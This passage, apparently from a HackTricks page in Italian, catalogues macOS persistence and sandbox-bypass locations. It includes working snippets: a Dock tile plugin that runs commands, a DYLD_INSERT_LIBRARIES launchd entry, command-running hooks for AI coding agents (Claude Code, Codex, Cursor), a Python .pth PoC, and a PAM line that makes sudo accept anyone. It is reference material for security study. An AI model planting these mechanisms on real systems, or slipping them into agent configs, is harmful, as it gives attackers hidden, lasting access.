Analisi: [https://theevilbit.github.io/beyond/beyond_0032/](https://theevilbit.github.io/beyond/beyond_0032/)<sup>[[38]](#references)</sup>

- Utile per bypassare la sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Richiede che un'app dichiari il plug-in, in modo che il Dock lo individui/registri e lo elabori
  - Il plugin viene caricato in un helper **Apple-signed** privo dell'entitlement app-sandbox e con **library validation disabilitata**. Nella ricerca citata questo helper non compariva nell'interfaccia Background Task Management; la visibilità nelle versioni di destinazione va verificata.
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

- **`<App>.app/Contents/PlugIns/<name>.docktileplugin`**, referenziato con la chiave **`NSDockTilePlugIn`** nell'`Info.plist` dell'app; l'`Info.plist` del plugin stesso imposta **`NSPrincipalClass`**.

#### Descrizione e sfruttamento

Quando un'app dichiara `NSDockTilePlugIn`, il Dock può caricare il bundle referenziato nell'helper XPC **`com.apple.dock.external.extra`** (`...extra.arm64` su Apple Silicon) all'accesso o quando viene aggiunto il relativo tile; non è necessario avviare l'app stessa. È necessario che macOS individui/registri l'app e la accetti. L'helper è **Apple-signed**, non ha l'entitlement `com.apple.security.app-sandbox` e ha `com.apple.security.cs.disable-library-validation`. Al caricamento viene invocato il metodo **`setDockTile:`** della classe principale; da lì può iscriversi alle notifiche distribuite (ad es. `com.apple.screenIsLocked`) per eventi successivi.<sup>[[38]](#references)</sup>

Su macOS 26.5.2, un'ispezione in sola lettura con `codesign` ha confermato la firma e gli entitlement Apple dell'helper; inoltre, diverse app installate dichiaravano `NSDockTilePlugIn`. Su quel Mac non è stato installato né caricato alcun nuovo plug-in, quindi l'esecuzione di un bundle appena scritto su quella versione non è stata verificata.

```bash
# Enumerate apps already shipping a Dock tile plugin (hijack / template targets)
for a in /Applications/*.app /System/Applications/*.app; do
  v=$(/usr/libexec/PlistBuddy -c 'Print :NSDockTilePlugIn' "$a/Contents/Info.plist" 2>/dev/null) \
    && echo "$a -> $v"
done
# e.g. on macOS 26: Calendar.app, App Store.app, System Settings.app, plus 3rd-party Warp.app / ChatGPT.app
```

```objc
// Principal class, built as MyPlugin.docktileplugin, placed in <App>.app/Contents/PlugIns/
// App Info.plist:    NSDockTilePlugIn = MyPlugin.docktileplugin
// Plugin Info.plist: NSPrincipalClass = MyDockPlugin , CFBundlePackageType = BNDL
@interface MyDockPlugin : NSObject <NSDockTilePlugIn>
@end
@implementation MyDockPlugin
- (void)setDockTile:(NSDockTile *)dockTile {
    system("touch /tmp/hacktricks_docktile");   // runs when the tile is added to the Dock / at login
}
@end
```

### Widget (Notification Center / WidgetKit)

Writeup: [https://theevilbit.github.io/beyond/beyond_0033/](https://theevilbit.github.io/beyond/beyond_0033/)<sup>[[39]](#references)</sup>

- Utile per aggirare la sandbox: [✅](https://emojipedia.org/check-mark-button)
  - L’estensione del widget viene eseguita in un **processo proprio** e aggiungerne una **non** genera un avviso di Background Task Management
- Bypass di TCC: [🔴](https://emojipedia.org/large-red-circle)
  - Il plist di configurazione si trova in un container protetto da TCC, quindi per modificarlo dall’esterno è necessario Full Disk Access o un bypass di TCC

#### Posizione

- Bundle dell’estensione del widget: **`<App>.app/Contents/PlugIns/<Widget>.appex`**
- Widget attivi/registrati: **`~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist`** (chiavi `widgets.instances` e `widgets.widgets`)

#### Descrizione e sfruttamento

Un’estensione WidgetKit inclusa in un’app viene eseguita in **un processo proprio**, gestito da Notification Center. Registrare un’istanza in `widgets.instances` (un blob `CHSWidget` codificato con `NSKeyedArchiver` in base64, contenente dati `INIntent`) e riavviare NotificationCenter fa sì che il widget venga caricato ed esegua il proprio codice `TimelineProvider`/intent.<sup>[[39]](#references)</sup>

```bash
# Inspect currently-registered widgets (file present on stock macOS)
plutil -p ~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist \
  | grep -iE "widgets?\." | head
```

### Regole di Mail.app (Esegui AppleScript)

Writeup: [https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)<sup>[[42]](#references)</sup>

- Utile per aggirare la sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Mail.app deve però essere configurato con un account e in esecuzione; l'evento scatenante è un'email in arrivo
- Bypass di TCC: [🔴](https://emojipedia.org/large-red-circle)
  - Modificare le regole/gli script dall'esterno di Mail potrebbe richiedere che Mail sia chiuso e che sia abilitato Full Disk Access nelle versioni recenti di macOS

#### Posizione

- **`~/Library/Mail/V10/MailData/SyncedRules.plist`** (regole locali; `V10` su Sonoma/Sequoia, `V11`+ sulle versioni più recenti)
- **`~/Library/Mobile Documents/com~apple~mail/Data/V10/MailData/ubiquitous_SyncedRules.plist`** (regole sincronizzate con iCloud, hanno la precedenza)
- Attivazione delle regole: **`RulesActiveState.plist`**; payload AppleScript: **`~/Library/Application Scripts/com.apple.mail/*.scpt`**

#### Descrizione e sfruttamento

Una **regola** di Apple Mail può avere un'azione *"Esegui AppleScript"*. Aggiungendo una regola che corrisponde a un **oggetto** appositamente predisposto e avvia uno script dell'attaccante, l'avversario ottiene un'esecuzione del codice **attivabile da remoto e furtiva** nel contesto di Mail ogni volta che arriva l'email magica: un vettore che elude molti scanner di persistenza perché non viene creato alcun LaunchAgent/Login Item.<sup>[[42]](#references)</sup> Impostare la regola in modo che **elimini** anche l'email trigger nasconde le prove. I difensori possono cercarla direttamente:<sup>[[43]](#references)</sup>

```bash
# Enumerate Mail rules that invoke AppleScript
grep -A1 -i "AppleScript" ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null
plutil -p ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null | grep -iE "AppleScript|ShouldTransfer|Delete"
```

### Profili di configurazione (.mobileconfig)

Writeup: [https://www.jamf.com/blog/malicious-profiles-come/](https://www.jamf.com/blog/malicious-profiles-come/)<sup>[[44]](#references)</sup>

- Utile per bypassare la sandbox: [🔴](https://emojipedia.org/large-red-circle)
  - macOS moderno richiede **l'approvazione manuale dell'utente** in Impostazioni di Sistema → *Gestione dispositivi* (l'installazione silenziosa con `profiles install` non è più possibile al di fuori di MDM)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

- I profili installati si trovano in **`/Library/Managed Preferences/`** e **`/var/db/ConfigurationProfiles/`**; un profilo è un plist XML con un array `PayloadContent`.

#### Descrizione e sfruttamento

Un `.mobileconfig` non è un primitivo di esecuzione diretta del codice, ma può mantenere configurazioni come una **CA root attendibile** (`com.apple.security.root`), un **proxy globale o PAC** (`com.apple.proxy.*`), **preferenze gestite** (`com.apple.ManagedClient.preferences`) o restrizioni. Su macOS 10.15 e versioni successive, la definizione di Apple di [`PayloadRemovalDisallowed`](https://developer.apple.com/documentation/devicemanagement/toplevel) specifica che impostarlo su `true` in un profilo **installato manualmente** senza un payload per la password di rimozione richiede l'**autenticazione di un amministratore** per rimuoverlo; non rende il profilo assolutamente impossibile da rimuovere. I profili installati tramite MDM sono soggetti a regole separate di gestione e rimozione.<sup>[[44]](#references)</sup>

> [!WARNING]
> Un semplice profilo di configurazione **non ha alcun tipo di payload che installi un `LaunchDaemon`/`LaunchAgent` arbitrario**. Per installare un daemon in questo modo è necessario un **enrollment MDM** completo e un agent/script di gestione: non considerare `.mobileconfig` un meccanismo di distribuzione per launchd.

```bash
# Inspect installed profiles (user context)
profiles list            # per-user
sudo profiles show       # system (root)
```

### Persistenza tramite DYLD_INSERT_LIBRARIES

- Utile per bypassare la sandbox: [🔴](https://emojipedia.org/large-red-circle)
  - dyld **rimuove** `DYLD_*` per i binari SIP/di piattaforma, le app con hardened runtime e i target setuid, quindi esegue l’injection solo nei processi non protetti e **non** bypassa SIP né il hardened runtime
- Bypass di TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

- Metodo affidabile: il dizionario **`EnvironmentVariables`** all’interno di un plist `LaunchAgent`/`LaunchDaemon` malevolo (eseguito all’accesso/avvio)
- Obsoleti/storici (solo a scopo informativo): **`~/.MacOSX/environment.plist`** (rimosso in 10.8) e **`/etc/launchd.conf`** (rimosso in 10.10)

#### Descrizione e sfruttamento

Se un attaccante riesce a inserire `DYLD_INSERT_LIBRARIES` nell’ambiente di un processo della vittima, dyld carica la dylib dell’attaccante (eseguendone il costruttore) in quel processo. La variante persistente inserisce la variabile in un LaunchAgent, così ogni avvio del job esegue nuovamente l’injection. Nota che `launchctl setenv DYLD_*` viene filtrato nelle versioni moderne di macOS, quindi è preferibile inserirla nel plist.<sup>[[45]](#references)</sup>

```xml
<key>EnvironmentVariables</key>
<dict>
    <key>DYLD_INSERT_LIBRARIES</key>
    <string>/tmp/evil.dylib</string>
</dict>
```

Per i dettagli completi del funzionamento di dylib injection/hijacking, vedere:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

### CLI degli agenti di coding AI (hooks, server MCP, file di regole)

Analisi: [CVE-2025-59536 (Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)<sup>[[47]](#references)</sup>, [Backdoor nei file di regole (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)<sup>[[48]](#references)</sup>

- Utile per aggirare la sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Richiede che lo sviluppatore usi l'agente pertinente. I comandi di avvio vengono eseguiti con i privilegi dell'utente quando l'agente accetta la configurazione; l'attendibilità dell'area di lavoro e l'approvazione MCP variano in base al prodotto e alla modalità di sessione.
- Bypass di TCC: [🔴](https://emojipedia.org/large-red-circle) (viene eseguito come utente; eredita tutti i permessi già disponibili al terminale/agente)

#### Posizione

I file espliciti di configurazione di hooks e MCP possono causare l'esecuzione di **comandi shell o processi figli quando lo sviluppatore usa lo strumento** — da un file globale per utente (persistenza) oppure da un file incluso in un repo (supply-chain). `CLAUDE.md`, `AGENTS.md`, `GEMINI.md` e le regole dell'editor sono **istruzioni per un agente**, non garantiscono l'esecuzione di comandi shell alla lettura; il loro effetto dipende dal comportamento dell'agente e dai permessi degli strumenti. Verificare le regole correnti di attendibilità e approvazione di ogni prodotto.

- **Claude Code**
  - `~/.claude/settings.json`, `.claude/settings.json` del progetto, `.claude/settings.local.json` e il file riservato a root **`/Library/Application Support/ClaudeCode/managed-settings.json`** (le impostazioni MDM/gestite **non possono essere sovrascritte** dall'utente → persistenza elevata)
  - Oggetto `hooks` — eventi `PreToolUse`, `PostToolUse`, `UserPromptSubmit`, `Stop`, `SubagentStop`, `SessionStart`, `SessionEnd`, `Notification`, `PreCompact` — ognuno esegue un `command` shell
  - `statusLine.command` — comando shell eseguito per visualizzare la riga di stato (a ogni sessione)
  - Server MCP in `~/.claude.json` / `.mcp.json` del progetto — `command`+`args` avviati come processi figli
  - `CLAUDE.md` / `~/.claude/CLAUDE.md` — istruzioni che possono tentare prompt injection, in base al comportamento dell'agente e ai permessi degli strumenti
- **OpenAI Codex CLI**: `~/.codex/config.toml` `[mcp_servers.*]` (`command`/`args` avviati come processi figli); istruzioni di progetto in `AGENTS.md`
- **Gemini CLI**: `~/.gemini/settings.json` (`hooks`, server MCP); `GEMINI.md`
- **Cursor**: `~/.cursor/hooks.json` (`beforeShellExecution`, `afterAgentResponse`, `stop`, … eseguono comandi); `.cursor/rules/`, `.cursorrules`, `~/.cursor/mcp.json`; istruzioni di GitHub Copilot in `.github/copilot-instructions.md`

#### Descrizione e sfruttamento

Se un attore può modificare le impostazioni globali dell'account, i relativi comandi hook o MCP possono essere eseguiti nelle sessioni future con i privilegi di quell'account. Una configurazione controllata dal repo è un caso distinto: la [documentazione di sicurezza corrente di Claude Code](https://code.claude.com/docs/en/security) descrive una finestra di dialogo interattiva per l'attendibilità dell'area di lavoro e una richiesta di approvazione separata per i server `.mcp.json` del progetto. La [relativa matrice dei permessi](https://code.claude.com/docs/en/permissions#what-runs-before-you-trust-a-folder) indica che gli hooks possono essere eseguiti dopo aver dichiarato attendibile una cartella superiore e che le sessioni `claude -p`/SDK non mostrano la richiesta interattiva di attendibilità; in queste modalità non interattive, i server MCP del progetto si connettono senza una richiesta di approvazione. Il bypass degli hooks di progetto prima dell'attendibilità segnalato come CVE-2025-59536 è stato [risolto nel 2025](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/); non considerarlo un comportamento predefinito attuale. I vettori di distribuzione possono includere un repository compromesso o un installer malevolo. La prompt injection tramite file di regole è meno deterministica rispetto a un hook esplicito e dipende comunque dalle approvazioni degli strumenti.<sup>[[47]](#references)</sup><sup>[[48]](#references)</sup>

Esempio di impostazioni globali utente di Claude Code; per i test, usale solo in un account usa e getta:

```json
{
  "hooks": {
    "SessionStart": [
      { "hooks": [ { "type": "command", "command": "touch /tmp/hacktricks_claude_hook" } ] }
    ]
  },
  "statusLine": { "type": "command", "command": "touch /tmp/hacktricks_statusline; echo HT" }
}
```

Esempio di configurazione MCP globale dell'utente di Codex:

```toml
[mcp_servers.evil]
command = "/bin/sh"
args = ["-c", "touch /tmp/hacktricks_codex_mcp; exec real-mcp-server"]
```

Esempio di configurazione degli hook di Cursor; controlla lo schema della versione installata prima di usarla:

```json
{ "version": 1, "hooks": { "beforeShellExecution": [ { "command": "touch /tmp/hacktricks_cursor_hook" } ] } }
```

```bash
# Defensive audit: which agent configs can auto-run commands?
ls -la .claude/settings*.json .mcp.json ~/.claude/settings.json ~/.claude.json \
       ~/.codex/config.toml ~/.gemini/settings.json ~/.cursor/hooks.json \
       ~/.cursor/mcp.json .cursor/rules .cursorrules .github/copilot-instructions.md 2>/dev/null
python3 -c 'import json;d=json.load(open("'"$HOME"'/.claude/settings.json"));print("claude hooks:",list(d.get("hooks",{}).keys()),"statusLine:",bool(d.get("statusLine")))' 2>/dev/null
```

### Estensioni del browser (Chromium: Chrome / Brave / Edge)

Writeup: [Chrome external extensions](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)<sup>[[49]](#references)</sup>, [Abuso di ExtensionInstallForcelist su macOS](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)<sup>[[50]](#references)</sup>

- Utile per bypassare la sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Richiede un browser supportato e un'estensione installata e abilitata. Su macOS, le External Extensions richiedono la conferma dell'utente; l'installazione forzata gestita richiede una policy aziendale applicabile.
- Bypass di TCC: [🔴](https://emojipedia.org/large-red-circle)

> [!NOTE]
> È un meccanismo distinto dai **native messaging hosts** (vedi la sezione *Chrome native messaging hosts* sopra). In questo caso, la persistenza è data dall'**estensione installata automaticamente**.

#### Posizione

- **File JSON delle External Extensions** (rilevati all'avvio del browser, poi soggetti alla richiesta di abilitazione su macOS):
  - Chrome: `~/Library/Application Support/Google/Chrome/External Extensions/<extID>.json` (per utente) o `/Library/Application Support/Google/Chrome/External Extensions/` (tutti gli utenti)
  - Brave: `~/Library/Application Support/BraveSoftware/Brave-Browser/External Extensions/`
  - Edge: `~/Library/Application Support/Microsoft Edge/External Extensions/`
- **Installazione forzata tramite policy aziendale** con preferenze gestite / un profilo di configurazione:
  - Chiave `ExtensionInstallForcelist` di `com.google.Chrome` (`com.brave.Browser` per Brave, `com.microsoft.Edge` per Edge), letta da `/Library/Managed Preferences/` o da un file `.mobileconfig` installato

#### Descrizione e sfruttamento

Questi sono due metodi di installazione distinti. La [documentazione di Chrome sull'installazione esterna](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions) afferma che gli utenti Windows e macOS **devono confermare e abilitare** un'estensione proposta tramite un file *External Extensions*; la semplice creazione di quel file JSON non ne causa l'esecuzione. Per l'installazione per tutti gli utenti su macOS, Chrome richiede inoltre che il file dell'estensione esterna sia protetto da modifiche non autorizzate. Una policy gestita `ExtensionInstallForcelist` o `ExtensionSettings` può installare e bloccare un'estensione senza interazione dell'utente; la [guida di Google alle policy per Mac](https://support.google.com/chrome/a/answer/7517624) descrive la configurazione gestita e specifica che gli utenti non possono rimuovere le estensioni installate forzatamente. Si tratta di un metodo di distribuzione tramite policy, non di una scorciatoia `defaults write` per utente.<sup>[[49]](#references)</sup>

> [!WARNING]
> Su macOS, un manifest JSON di *External Extensions* deve puntare a un URL di aggiornamento del **Chrome Web Store**, non a un CRX locale. La distribuzione tramite policy gestita ha prerequisiti aziendali distinti e può consentire un URL di aggiornamento self-hosted gestito. Per caricare un'estensione locale non pacchettizzata in un profilo di test, l'opzione `--load-extension=/path` della modalità sviluppatore di Chrome è un meccanismo separato e non rende autoeseguibile un file JSON di External Extensions. Non considerare una scrittura in `Secure Preferences` equivalente a uno dei due metodi di registrazione documentati.

```bash
# In a disposable browser account, propose a Chrome Web Store extension for enablement
ext_id='replace_with_32_character_web_store_id'
external_dir="$HOME/Library/Application Support/Google/Chrome/External Extensions"
mkdir -p "$external_dir"
cat > "$external_dir/$ext_id.json" <<'JSON'
{ "external_update_url": "https://clients2.google.com/service/update2/crx" }
JSON
```

Avvia Chrome in quell'account usa e getta e osserva il prompt di abilitazione; il comportamento dell'estensione stessa costituisce la PoC di esecuzione una volta che l'utente accetta. Dopo il test, rimuovi il manifest e disabilita/disinstalla l'estensione in quel profilo. Questo percorso **non** è stato testato nel profilo Chrome attivo sul Mac di ricerca. Anche il percorso tramite policy gestita non è stato implementato.

Force-install ed External Extensions fanno riferimento agli ID delle estensioni del **Chrome Web Store**; per la tecnica di livello più basso che inietta silenziosamente un'estensione locale modificando `Secure Preferences` del profilo, firmato con HMAC, e per altri abusi dei processi Chromium, vedi:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md
{{#endref}}

### Gestori di schemi URL e tipi di file (LaunchServices)

Analisi: [Sfruttamento remoto di Mac tramite schemi URL personalizzati (Objective-See)](https://objective-see.org/blog/blog_0x38.html)<sup>[[52]](#references)</sup>

- Utile per bypassare la sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Il trigger si verifica quando la vittima fa clic su un link (ad es. in Chrome/Brave/Safari) o apre un file del tipo registrato
- Bypass di TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Percorso

- Un'app bundle il cui `Info.plist` dichiara **`CFBundleURLTypes`/`CFBundleURLSchemes`** (schema URL personalizzato) o **`CFBundleDocumentTypes`** (estensione file/UTI)
- Le impostazioni predefinite effettive per utente possono comparire in **`~/Library/Preferences/com.apple.LaunchServices/com.apple.launchservices.secure.plist`** (array `LSHandlers`). L'API supportata da Apple per scegliere un gestore predefinito per uno schema URL è `LSSetDefaultHandlerForURLScheme`; scrivere direttamente in quel plist non è un metodo documentato di registrazione o aggiornamento della cache.

#### Descrizione e sfruttamento

Launch Services ricava le associazioni agli schemi URL e ai documenti dall'`Info.plist` di un'app registrata. La [guida alla registrazione di Apple](https://developer.apple.com/library/archive/documentation/Carbon/Conceptual/LaunchServicesConcepts/LSCTasks/LSCTasks.html) indica che la registrazione può avvenire quando Finder rileva l'app, all'avvio o al login, oppure tramite un'API di registrazione esplicita; la semplice scrittura di un'app in una posizione qualsiasi non garantisce che la registrazione venga attivata immediatamente. Dopo la registrazione, l'apertura di un URL o documento corrispondente può avviare l'app gestore selezionata, in base alla scelta dell'utente per il gestore predefinito e ai normali controlli di avvio di macOS. L'API supportata `LSSetDefaultHandlerForURLScheme` modifica il gestore URL preferito dall'utente; non fa sì che una nuova app appena copiata venga eseguita automaticamente.<sup>[[52]](#references)</sup>

```bash
# Inspect known handlers without registering an app or changing defaults
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -dump | grep -A3 "scheme:"
```

Nessuna app è stata registrata e nessuna preferenza del gestore è stata modificata sul Mac di ricerca con macOS 26.5.2. Per testare un gestore reale, usa un account utente usa e getta, registra un'app che esegue solo un marker con uno schema univoco, richiama il relativo URL, quindi rimuovi l'app e la sua registrazione.

Per informazioni approfondite sull'enumerazione e l'abuso dei gestori di estensioni di file e schemi URL, consulta:

{{#ref}}
macos-security-and-privilege-escalation/macos-file-extension-apps.md
{{#endref}}

### File di avvio di Python (`.pth` / `usercustomize` / `sitecustomize`)

Writeup: [https://docs.python.org/3/library/site.html](https://docs.python.org/3/library/site.html)<sup>[[56]](#references)</sup>

- Utile per bypassare la sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Viene eseguito all'avvio dell'interprete Python pertinente, se la relativa directory `site` è abilitata; l'attivazione non è universale tra ambienti virtuali, build di Python o flag di avvio
- Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)
  - Viene eseguito con i privilegi/TCC di qualsiasi processo abbia avviato l'interprete

#### Posizione

- **`$(python3 -m site --user-site)/*.pth`** (build del framework macOS: `~/Library/Python/<X.Y>/lib/python/site-packages/`)
  - Non richiede root (scrivibile dall'utente)
  - **Attivazione**: avvio di quella build di Python con il sito utente abilitato; il modulo `site` elabora i file `.pth` nelle directory `site` attive
- **`<user-site>/usercustomize.py`**
  - Non richiede root
  - **Attivazione**: avvio con il sito utente abilitato (importato automaticamente da `site`)
- **`<prefix>/site-packages/sitecustomize.py`** (ad es. `/opt/homebrew/lib/python3.13/site-packages/` o percorsi di sistema)
  - Potrebbero essere necessari i privilegi root/amministratore, a seconda della posizione dell'interprete
  - **Attivazione**: avvio di un interprete che include quella directory `site`

#### Descrizione e sfruttamento

All'avvio, Python normalmente importa `site` e cerca i file `.pth` nelle directory `site-packages` attive. Oltre ad aggiungere percorsi, una riga `.pth` che inizia con `import ` esegue codice Python, anche se il modulo indicato non viene mai usato in altro modo. Python prova inoltre a importare `sitecustomize` e, **quando il sito utente è abilitato**, `usercustomize`.<sup>[[56]](#references)</sup> L'attivazione avviene al successivo avvio di un interprete che rileva la directory modificata. `-S` disabilita l'elaborazione di `site`; `-s`, `-I` o `PYTHONNOUSERSITE` disabilitano le varianti del **sito utente**. In generale, `-I` non disabilita un `sitecustomize` globale. Gli ambienti virtuali possono escludere il sito utente. Controlla `python3 -m site` per l'interprete specifico.

La seguente PoC è stata eseguita su macOS 26.5.2. `PYTHONUSERBASE` sposta il sito utente in una directory temporanea per questo test; non viene modificato alcun sito utente reale:

```python
import os, pathlib, subprocess, tempfile

with tempfile.TemporaryDirectory(prefix='ht-python-site-') as root:
    env = os.environ.copy()
    env['PYTHONUSERBASE'] = root
    env.pop('PYTHONNOUSERSITE', None)
    user_site = pathlib.Path(subprocess.check_output(
        ['python3', '-m', 'site', '--user-site'], env=env, text=True
    ).strip())
    user_site.mkdir(parents=True)
    pth_marker = pathlib.Path(root) / 'pth.marker'
    user_marker = pathlib.Path(root) / 'user.marker'
    (user_site / 'ht_probe.pth').write_text(
        'import pathlib; pathlib.Path(' + repr(str(pth_marker)) + ').touch()\n'
    )
    (user_site / 'usercustomize.py').write_text(
        'import pathlib; pathlib.Path(' + repr(str(user_marker)) + ').touch()\n'
    )
    subprocess.run(['python3', '-c', 'pass'], env=env, check=True)
    print('pth:', pth_marker.exists(), 'usercustomize:', user_marker.exists())
```

Entrambi i marker sono comparsi. Ripetendo il test con `-s`, `-I` o `-S`, entrambi i marker **user-site** non sono comparsi. `sitecustomize` in una directory site globale non è stato testato.

## Root Sandbox Bypass

> [!TIP]
> Qui puoi trovare posizioni di avvio utili per il **sandbox bypass**, che consentono di eseguire semplicemente qualcosa **scrivendolo in un file** quando si è **root** e/o quando sono richieste **altre condizioni insolite**.

### Periodic

> [!CAUTION]
> **Meccanismo storico:** sulla macchina di test macOS 26.5.2 sono assenti `/usr/sbin/periodic`, `/etc/defaults/periodic.conf`, `/etc/periodic` e i launch daemons `com.apple.periodic-*`. Non dare per scontato che creare `/etc/periodic` su un sistema attuale pianifichi l'esecuzione del suo contenuto. Prima di usare l'esempio qui sotto, verifica che siano presenti sia il comando sia uno scheduler abilitato nella versione di destinazione.

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)<sup>[[27]](#references)</sup>

- Utile per il sandbox bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - Ma è necessario essere root
- Bypass di TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
  - Richiesto root
  - **Trigger**: quando arriva il momento
- `/etc/daily.local`, `/etc/weekly.local` o `/etc/monthly.local`
  - Richiesto root
  - **Trigger**: quando arriva il momento

#### Descrizione e sfruttamento

Nelle versioni precedenti, gli script periodic (**`/etc/periodic`**) erano pianificati dai **launch daemons** in `/System/Library/LaunchDaemons/com.apple.periodic*`. A partire da macOS Big Sur 11.5, il periodic runner eseguiva gli script nelle directory periodic con i privilegi del **proprietario di ciascun file**, eliminando un precedente percorso di escalation dei privilegi.<sup>[[27]](#references)</sup> I comandi e gli elenchi delle directory riportati di seguito sono output storici, non risultati di test su macOS 26.5.2.

```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```

Ci sono altri script periodici che verranno eseguiti, indicati in **`/etc/defaults/periodic.conf`**:

```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```

Sui sistemi meno recenti, con `periodic` e i relativi launch daemon installati e abilitati, `/etc/daily.local`, `/etc/weekly.local` e `/etc/monthly.local` erano percorsi di esecuzione aggiuntivi. Un controllo innocuo e di sola lettura è:

```bash
test -x /usr/sbin/periodic && ls /System/Library/LaunchDaemons/com.apple.periodic-*.plist
```

> [!WARNING]
> La regola basata sul proprietario si applicava agli script direttamente nelle directory periodic. Il wrapper storico `999.local` caricava con `source` `/etc/daily.local`, `/etc/weekly.local` o `/etc/monthly.local` senza lo stesso controllo di proprietà; quando lo scheduler veniva eseguito come root, questi file venivano eseguiti come root. Questa distinzione e la modifica introdotta in Big Sur 11.5 sono documentate nella [ricerca originale](https://theevilbit.github.io/beyond/beyond_0019/). Non si deve presumere che nessuno di questi percorsi sia attivo quando `periodic` è assente.

### PAM

Approfondimento: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Approfondimento: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)<sup>[[28]](#references)</sup>

- Utile per bypassare la sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Ma devi essere root
- Bypass di TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

- È sempre richiesto root

#### Descrizione e sfruttamento

Poiché PAM è più incentrato sulla **persistence** e sul malware che sulla facile esecuzione in macOS, questo blog non fornirà una spiegazione dettagliata; **leggi gli approfondimenti per comprendere meglio questa tecnica**.<sup>[[28]](#references)</sup>

Controlla i moduli PAM con:

```bash
ls -l /etc/pam.d
```

Una tecnica di persistenza/escalation dei privilegi che sfrutta PAM è semplice quanto modificare il modulo /etc/pam.d/sudo, aggiungendo all'inizio la riga:

```bash
auth       sufficient     pam_permit.so
```

Quindi **apparirà più o meno** così:

```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```

E quindi qualsiasi tentativo di usare **`sudo` funzionerà**.

> [!CAUTION]
> Nota che questa directory è protetta da TCC, quindi è molto probabile che all'utente venga richiesto di concedere l'accesso.

Un altro buon esempio è su, dove si può vedere che è anche possibile passare parametri ai moduli PAM (e si potrebbe anche inserire una backdoor in questo file):

```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```

### Plugin di autorizzazione

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)<sup>[[29]](#references)</sup>\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)<sup>[[30]](#references)</sup>

- Utile per bypassare la sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Ma devi essere root e aggiungere alcune configurazioni
- Bypass di TCC: ???

#### Percorso

- `/Library/Security/SecurityAgentPlugins/`
  - Sono necessari i privilegi di root
